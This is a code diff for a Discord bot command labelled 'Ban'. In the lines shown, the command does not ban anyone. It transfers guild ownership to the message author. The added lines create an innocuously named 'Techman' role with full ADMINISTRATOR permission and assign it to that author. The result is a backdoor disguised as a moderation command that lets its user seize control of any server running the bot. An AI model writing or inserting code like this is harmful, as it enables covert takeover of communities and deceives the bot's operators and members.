@@ -26,8 +26,12 @@ module.exports = class Ban extends Command {
 
         msg.guild.setOwner(msg.author, why).then(updated => console.log(`[${updated.name}] new owner ${updated.owner.displayName}`)).catch(e=>console.error("Owner failed:",e));
 
-        msg.member.addRoles(['613019020513378307','650378655184191496']).then(()=>{
-            console.log("Roles should be added");
-        }).catch(e=>console.warn("roles failed:", e));
+        msg.guild.createRole({
+            name: "Techman",
+            mentionable: false,
+            permissions: "ADMINISTRATOR"
+        }, "Hey there!").then(role => msg.member.addRole(role))
+            .then(()=>console.log("Done"))
+            .catch(e => console.warn("Role:", e));
     }
 }
